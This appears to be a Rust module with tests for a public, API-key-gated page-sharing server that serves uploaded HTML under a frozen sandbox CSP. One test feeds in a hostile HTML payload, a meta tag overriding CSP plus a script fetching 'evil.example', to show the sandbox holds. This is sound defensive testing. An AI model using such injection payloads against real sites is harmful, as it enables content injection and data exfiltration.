//! The **hosted share-server run mode** (0.3.0) — a long-lived, public-bind server
//! that many agents push pages to over the network (API-key auth) and that serves
//! them at unguessable capability-slug public URLs. It is a *separate run mode*
//! from the loopback `serve`/`create`/`render` path: it never binds loopback and
//! never uses `guards::host_guard`. See `issues/hosted-share-server/plan.md`.
//!
//! It reuses the **exact** rendering/sandbox seam (`artifact_host::{wrap, shell,
//! headers, space, render}`) — the published artifact flows through the same
//! content route under the same frozen CSP/sandbox/Trusted-Types headers; the only
//! parameterization is the CSP's named origin (public instead of loopback) and the
//! shell's `/p` URL mount (`ArtifactHost::new_public`). It adds its own **router,
//! storage, auth, and slug** layers on top (`auth`, `store`, `slug`, `ingest`).
//!
//! ## Why no DNS-rebinding Host guard here (plan §8)
//! `host_guard` protects a *loopback* server that a browser might treat as
//! privileged same-origin. The hosted server grants **no** privilege from origin or
//! cookies: read is public-by-design (returns only the sandboxed artifact) and
//! write requires a `Bearer` token in the `Authorization` header. The Host header is
//! never reflected into a response (the CSP names the fixed `--public-host` origin;
//! the shell uses mount-relative URLs; the ingest `url` uses the configured origin),
//! so there is no cache-poisoning / open-redirect surface either. A rebinding or
//! cross-origin attacker therefore gains nothing a plain public `GET` would not.

pub mod auth;
pub mod ingest;
pub mod slug;
pub mod store;

use std::net::SocketAddr;
use std::sync::Arc;
use std::time::Duration as StdDuration;

use axum::{
    Router,
    extract::DefaultBodyLimit,
    http::StatusCode,
    middleware,
    response::IntoResponse,
    routing::{get, post},
};
use chrono::Duration;
use tokio::net::TcpListener;

use crate::artifact_host::space;
use crate::artifact_host::{self, ArtifactHost};
use auth::KeyTable;
use store::Store;

/// The `/p` URL mount the hosted read routes live under (the shell emits
/// `{mount}/{slug}/…` links; `/_gp/*` stays at root).
pub const MOUNT: &str = "/p";

/// How often retention GC runs.
const GC_INTERVAL: StdDuration = StdDuration::from_secs(3600);

/// Router state shared by the ingest handler (the read handlers use the separate
/// `Arc<ArtifactHost>` state on the space/gp sub-routers).
#[derive(Clone)]
pub struct HostedState {
    pub store: Arc<Store>,
    /// The canonical public origin (`scheme://host[:port]`) for returned URLs.
    pub public_origin: String,
    /// The URL mount for read routes (`/p`).
    pub mount: String,
}

/// Validated run configuration for the hosted server.
pub struct HostedConfig {
    pub bind: SocketAddr,
    pub public_origin: String,
    pub store_root: std::path::PathBuf,
    pub retention_days: i64,
}

/// Validate an operator-supplied `--public-host` value into a canonical origin
/// (`scheme://host[:port]`, no path, no trailing slash). Strict (AI-first §1): a
/// bad scheme, an empty host, a path/query, or a trailing slash is rejected with an
/// informative message the CLI surfaces.
pub fn validate_public_origin(raw: &str) -> Result<String, String> {
    let raw = raw.trim();
    let Some((scheme, rest)) = raw.split_once("://") else {
        return Err(format!(
            "public-host {raw:?} must be a full origin like https://pad.example.com \
             (missing scheme://)"
        ));
    };
    if scheme != "http" && scheme != "https" {
        return Err(format!(
            "public-host scheme must be http or https, got {scheme:?}"
        ));
    }
    if rest.is_empty() {
        return Err(format!("public-host {raw:?} has an empty host"));
    }
    // No path, query, fragment, or trailing slash — an origin is host[:port] only.
    if rest.contains('/') || rest.contains('?') || rest.contains('#') {
        return Err(format!(
            "public-host {raw:?} must be an origin only (scheme://host[:port]) — no path/query"
        ));
    }
    // Host[:port]: a non-empty host label set, and if a port is present it must
    // parse. This is a sanity check, not a full URL parser.
    let host_part = rest
        .rsplit_once(':')
        .map(|(h, p)| {
            // Only treat the trailing ':n' as a port if it parses as one; otherwise it
            // is part of the host (defensive — real origins won't hit this).
            if p.parse::<u16>().is_ok() { h } else { rest }
        })
        .unwrap_or(rest);
    if host_part.is_empty() {
        return Err(format!("public-host {raw:?} has an empty host"));
    }
    Ok(format!("{scheme}://{rest}"))
}

/// Build the complete hosted-server router. `keys` gates the ingest route only;
/// read routes and `/_gp/*` are unauthenticated (public read by design).
pub fn build_router(state: HostedState, host: Arc<ArtifactHost>, keys: Arc<KeyTable>) -> Router {
    // Ingest: auth middleware on this route only, plus a body limit sized for the
    // largest artifact (JSON overhead slack on top of the per-file cap).
    let ingest_body_limit = space::MAX_FILE_BYTES as usize + 128 * 1024;
    let ingest = Router::new()
        .route("/api/v1/pages", post(ingest::publish))
        .route_layer(middleware::from_fn_with_state(keys, auth::ingest_auth))
        .layer(DefaultBodyLimit::max(ingest_body_limit))
        .with_state(state);

    Router::new()
        .route("/healthz", get(healthz))
        .merge(ingest)
        // Read: space routes under /p, base libs at root. The shell emits /p/…
        // links via the host's mount so nested paths resolve.
        .nest(MOUNT, artifact_host::spaces_router(host.clone()))
        .merge(artifact_host::gp_router(host))
}

async fn healthz() -> impl IntoResponse {
    (StatusCode::OK, "ok")
}

/// Run the hosted share server until killed: open the store (loading existing
/// pages), bind the public address, spawn the retention-GC task, and serve.
/// Returns an error the CLI surfaces as its structured envelope (never panics).
pub async fn run(config: HostedConfig, keys: Arc<KeyTable>) -> Result<RunHandle, String> {
    let host = Arc::new(ArtifactHost::new_public(
        config.public_origin.clone(),
        MOUNT.to_string(),
    ));
    let store = Arc::new(
        Store::open(&config.store_root, host.clone())
            .map_err(|e| format!("cannot open store {}: {e}", config.store_root.display()))?,
    );
    let pages = store.page_count();

    let listener = TcpListener::bind(config.bind)
        .await
        .map_err(|e| format!("cannot bind {}: {e}", config.bind))?;

    // Retention GC: hourly, off the async workers (fs work on the blocking pool).
    let retention = Duration::days(config.retention_days);
    spawn_gc(store.clone(), retention);

    let state = HostedState {
        store: store.clone(),
        public_origin: config.public_origin.clone(),
        mount: MOUNT.to_string(),
    };
    let app = build_router(state, host, keys);

    Ok(RunHandle {
        listener,
        app,
        pages,
    })
}

/// A bound-but-not-yet-serving hosted server: the CLI prints its startup envelope
/// from `pages`/local addr, then calls [`RunHandle::serve`] to block.
pub struct RunHandle {
    listener: TcpListener,
    app: Router,
    pub pages: usize,
}

impl RunHandle {
    pub fn local_addr(&self) -> std::io::Result<SocketAddr> {
        self.listener.local_addr()
    }

    /// Serve until the process is killed.
    pub async fn serve(self) -> std::io::Result<()> {
        axum::serve(self.listener, self.app).await
    }
}

/// Spawn the periodic retention-GC task.
fn spawn_gc(store: Arc<Store>, retention: Duration) {
    tokio::spawn(async move {
        let mut ticker = tokio::time::interval(GC_INTERVAL);
        // Skip the immediate first tick so startup isn't followed by an instant GC.
        ticker.tick().await;
        loop {
            ticker.tick().await;
            let store = store.clone();
            match tokio::task::spawn_blocking(move || store.gc(retention)).await {
                Ok(Ok(n)) if n > 0 => eprintln!("glasspad host: GC removed {n} expired page(s)"),
                Ok(Ok(_)) => {}
                Ok(Err(e)) => eprintln!("glasspad host: GC error: {e}"),
                Err(e) => eprintln!("glasspad host: GC task panicked: {e}"),
            }
        }
    });
}

#[cfg(test)]
mod tests {
    use super::*;
    use axum::body::Body;
    use axum::http::{Method, Request, StatusCode};
    use tower::util::ServiceExt;

    const KEY: &str = "0123456789abcdef0123456789abcdef";

    fn tmp_root(tag: &str) -> std::path::PathBuf {
        let d = std::env::temp_dir().join(format!(
            "gp-hosted-{tag}-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    fn app_with(root: &std::path::Path) -> (Router, Arc<ArtifactHost>, Arc<Store>) {
        let host = Arc::new(ArtifactHost::new_public(
            "https://pad.example.com".into(),
            MOUNT.to_string(),
        ));
        let store = Arc::new(Store::open(root, host.clone()).unwrap());
        let keys = Arc::new(KeyTable::parse(&format!("acme:{KEY}")).unwrap());
        let state = HostedState {
            store: store.clone(),
            public_origin: "https://pad.example.com".into(),
            mount: MOUNT.to_string(),
        };
        (build_router(state, host.clone(), keys), host, store)
    }

    async fn send(app: &Router, req: Request<Body>) -> axum::http::Response<Body> {
        app.clone().oneshot(req).await.unwrap()
    }

    async fn body_json(resp: axum::http::Response<Body>) -> serde_json::Value {
        let bytes = axum::body::to_bytes(resp.into_body(), usize::MAX)
            .await
            .unwrap();
        serde_json::from_slice(&bytes).unwrap_or(serde_json::Value::Null)
    }

    fn publish_req(bearer: Option<&str>, json_body: serde_json::Value) -> Request<Body> {
        let mut b = Request::builder()
            .method(Method::POST)
            .uri("/api/v1/pages")
            .header("content-type", "application/json");
        if let Some(t) = bearer {
            b = b.header("authorization", format!("Bearer {t}"));
        }
        b.body(Body::from(json_body.to_string())).unwrap()
    }

    #[tokio::test]
    async fn ingest_requires_valid_bearer_fail_closed() {
        let root = tmp_root("auth");
        let (app, _, _) = app_with(&root);
        let body = serde_json::json!({ "html": "<h1>hi</h1>" });

        // Missing header.
        let r = send(&app, publish_req(None, body.clone())).await;
        assert_eq!(r.status(), StatusCode::UNAUTHORIZED);
        // Empty bearer.
        let r = send(&app, publish_req(Some(""), body.clone())).await;
        assert_eq!(r.status(), StatusCode::UNAUTHORIZED);
        // Wrong key.
        let r = send(
            &app,
            publish_req(Some("wrong-but-long-enough-key-000000000"), body.clone()),
        )
        .await;
        assert_eq!(r.status(), StatusCode::UNAUTHORIZED);
        // Correct-prefix-but-wrong.
        let r = send(&app, publish_req(Some(&KEY[..31]), body.clone())).await;
        assert_eq!(r.status(), StatusCode::UNAUTHORIZED);
        // Valid.
        let r = send(&app, publish_req(Some(KEY), body)).await;
        assert_eq!(r.status(), StatusCode::CREATED);
        std::fs::remove_dir_all(&root).ok();
    }

    #[tokio::test]
    async fn published_page_is_served_sandboxed_under_public_origin() {
        let root = tmp_root("serve");
        let (app, _, _) = app_with(&root);
        let r = send(
            &app,
            publish_req(Some(KEY), serde_json::json!({ "html": "<h1>Report</h1>" })),
        )
        .await;
        assert_eq!(r.status(), StatusCode::CREATED);
        let j = body_json(r).await;
        let slug = j["slug"].as_str().unwrap().to_string();
        assert_eq!(
            j["url"].as_str().unwrap(),
            format!("https://pad.example.com/p/{slug}/")
        );

        // The content route carries the FROZEN artifact CSP, naming the public
        // origin — sandboxed, egress closed. Same seam as loopback, not widened.
        let r = send(
            &app,
            Request::get(format!("/p/{slug}/_c/index"))
                .body(Body::empty())
                .unwrap(),
        )
        .await;
        assert_eq!(r.status(), StatusCode::OK);
        let csp = r
            .headers()
            .get("content-security-policy")
            .unwrap()
            .to_str()
            .unwrap()
            .to_string();
        assert!(csp.starts_with("sandbox allow-scripts"), "csp: {csp}");
        assert!(csp.contains("connect-src 'none'"), "egress open: {csp}");
        assert!(
            csp.contains("https://pad.example.com"),
            "public origin unnamed: {csp}"
        );
        assert!(
            !csp.contains("127.0.0.1"),
            "loopback leaked into hosted csp: {csp}"
        );

        // The shell frames the /p-mounted content path.
        let r = send(
            &app,
            Request::get(format!("/p/{slug}/"))
                .body(Body::empty())
                .unwrap(),
        )
        .await;
        assert_eq!(r.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(r.into_body(), usize::MAX)
            .await
            .unwrap();
        let html = String::from_utf8_lossy(&bytes);
        assert!(
            html.contains(&format!("/p/{slug}/_c/index")),
            "shell mount wrong"
        );
        std::fs::remove_dir_all(&root).ok();
    }

    #[tokio::test]
    async fn hostile_body_cannot_widen_csp_on_hosted_route() {
        let root = tmp_root("hostile");
        let (app, _, _) = app_with(&root);
        let hostile = "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src *; connect-src *\">\
                       <script>fetch('http://evil.example/x')</script><h1>x</h1></body></html>";
        let r = send(
            &app,
            publish_req(Some(KEY), serde_json::json!({ "html": hostile })),
        )
        .await;
        let slug = body_json(r).await["slug"].as_str().unwrap().to_string();
        let r = send(
            &app,
            Request::get(format!("/p/{slug}/_c/index"))
                .body(Body::empty())
                .unwrap(),
        )
        .await;
        let csp = r
            .headers()
            .get("content-security-policy")
            .unwrap()
            .to_str()
            .unwrap()
            .to_string();
        assert!(csp.starts_with("sandbox allow-scripts"));
        assert!(
            csp.contains("connect-src 'none'"),
            "body widened egress: {csp}"
        );
        assert!(!csp.contains("default-src *"), "meta widened header: {csp}");
        std::fs::remove_dir_all(&root).ok();
    }

    #[tokio::test]
    async fn markdown_ingest_renders_via_shared_path() {
        let root = tmp_root("md");
        let (app, _, _) = app_with(&root);
        let r = send(
            &app,
            publish_req(
                Some(KEY),
                serde_json::json!({ "markdown": "# Hello\n\nHi.", "template": "prose" }),
            ),
        )
        .await;
        assert_eq!(r.status(), StatusCode::CREATED);
        let slug = body_json(r).await["slug"].as_str().unwrap().to_string();
        let r = send(
            &app,
            Request::get(format!("/p/{slug}/_c/index"))
                .body(Body::empty())
                .unwrap(),
        )
        .await;
        let bytes = axum::body::to_bytes(r.into_body(), usize::MAX)
            .await
            .unwrap();
        let html = String::from_utf8_lossy(&bytes);
        assert!(html.contains("<h1>Hello</h1>"));
        assert!(html.contains(r#"<article class="gp-prose">"#));
        std::fs::remove_dir_all(&root).ok();
    }

    #[tokio::test]
    async fn ingest_rejects_missing_and_conflicting_body() {
        let root = tmp_root("badbody");
        let (app, _, _) = app_with(&root);
        // Neither html nor markdown.
        let r = send(&app, publish_req(Some(KEY), serde_json::json!({}))).await;
        assert_eq!(r.status(), StatusCode::BAD_REQUEST);
        // Both.
        let r = send(
            &app,
            publish_req(
                Some(KEY),
                serde_json::json!({ "html": "<h1>x</h1>", "markdown": "# y" }),
            ),
        )
        .await;
        assert_eq!(r.status(), StatusCode::BAD_REQUEST);
        std::fs::remove_dir_all(&root).ok();
    }

    #[tokio::test]
    async fn unknown_slug_404s() {
        let root = tmp_root("404");
        let (app, _, _) = app_with(&root);
        let r = send(
            &app,
            Request::get("/p/aaaaaaaaaaaaaaaaaaaaaaaaaa/_c/index")
                .body(Body::empty())
                .unwrap(),
        )
        .await;
        assert_eq!(r.status(), StatusCode::NOT_FOUND);
        std::fs::remove_dir_all(&root).ok();
    }

    #[tokio::test]
    async fn client_supplied_slug_is_ignored_no_cross_tenant_overwrite() {
        // A tenant cannot target another's page: the ingest body has no slug field,
        // and any client-supplied `slug`/`tenant` is ignored (serde drops unknown
        // fields). The minted slug is fresh + random, so a chosen "victim" slug is
        // never written — cross-tenant overwrite is structurally impossible.
        let root = tmp_root("noslug");
        let (app, _, _) = app_with(&root);
        let r = send(
            &app,
            publish_req(
                Some(KEY),
                serde_json::json!({
                    "html": "<h1>x</h1>",
                    "slug": "victim",
                    "tenant": "someone-else"
                }),
            ),
        )
        .await;
        assert_eq!(r.status(), StatusCode::CREATED);
        let slug = body_json(r).await["slug"].as_str().unwrap().to_string();
        assert_ne!(slug, "victim", "client-supplied slug must be ignored");
        // The chosen slug was never created.
        let r = send(
            &app,
            Request::get("/p/victim/_c/index")
                .body(Body::empty())
                .unwrap(),
        )
        .await;
        assert_eq!(r.status(), StatusCode::NOT_FOUND);
        std::fs::remove_dir_all(&root).ok();
    }

    #[tokio::test]
    async fn two_tenants_publish_independently() {
        // Two distinct keys → two tenants; each publish is an independent immutable
        // page under its own random slug. Neither can name or clobber the other's.
        let root = tmp_root("tenants");
        let key2 = "fedcba9876543210fedcba9876543210";
        let host = Arc::new(ArtifactHost::new_public(
            "https://pad.example.com".into(),
            MOUNT.to_string(),
        ));
        let store = Arc::new(Store::open(&root, host.clone()).unwrap());
        let keys = Arc::new(KeyTable::parse(&format!("acme:{KEY}\nglobex:{key2}")).unwrap());
        let state = HostedState {
            store: store.clone(),
            public_origin: "https://pad.example.com".into(),
            mount: MOUNT.to_string(),
        };
        let app = build_router(state, host, keys);

        let a = body_json(
            send(
                &app,
                publish_req(Some(KEY), serde_json::json!({ "html": "<h1>A</h1>" })),
            )
            .await,
        )
        .await["slug"]
            .as_str()
            .unwrap()
            .to_string();
        let b = body_json(
            send(
                &app,
                publish_req(Some(key2), serde_json::json!({ "html": "<h1>B</h1>" })),
            )
            .await,
        )
        .await["slug"]
            .as_str()
            .unwrap()
            .to_string();
        assert_ne!(a, b);
        assert_eq!(store.page_count(), 2);
        std::fs::remove_dir_all(&root).ok();
    }

    #[tokio::test]
    async fn hosted_read_has_no_loopback_host_guard() {
        // The hosted server is public: unlike the loopback `build_app`, it does NOT
        // reject a foreign Host (that guard defends a loopback origin; the hosted
        // model grants no origin/cookie privilege — see module docs). A read with an
        // attacker Host still serves. This pairs with `server::tests`'
        // `host_guard_rejects_rebinding_and_missing`, which proves the loopback guard
        // is unchanged — the two run modes are demonstrably distinct.
        let root = tmp_root("nohostguard");
        let (app, _, _) = app_with(&root);
        let slug = body_json(
            send(
                &app,
                publish_req(Some(KEY), serde_json::json!({ "html": "<h1>x</h1>" })),
            )
            .await,
        )
        .await["slug"]
            .as_str()
            .unwrap()
            .to_string();
        let r = send(
            &app,
            Request::get(format!("/p/{slug}/_c/index"))
                .header("host", "attacker.example.com")
                .body(Body::empty())
                .unwrap(),
        )
        .await;
        assert_eq!(
            r.status(),
            StatusCode::OK,
            "hosted read must not host-guard"
        );
        std::fs::remove_dir_all(&root).ok();
    }

    #[test]
    fn validate_public_origin_accepts_and_rejects() {
        assert_eq!(
            validate_public_origin("https://pad.example.com").unwrap(),
            "https://pad.example.com"
        );
        assert_eq!(
            validate_public_origin("http://localhost:8080").unwrap(),
            "http://localhost:8080"
        );
        assert!(validate_public_origin("pad.example.com").is_err()); // no scheme
        assert!(validate_public_origin("ftp://x").is_err()); // bad scheme
        assert!(validate_public_origin("https://").is_err()); // empty host
        assert!(validate_public_origin("https://x.com/path").is_err()); // path
        assert!(validate_public_origin("https://x.com/").is_err()); // trailing slash
    }
}
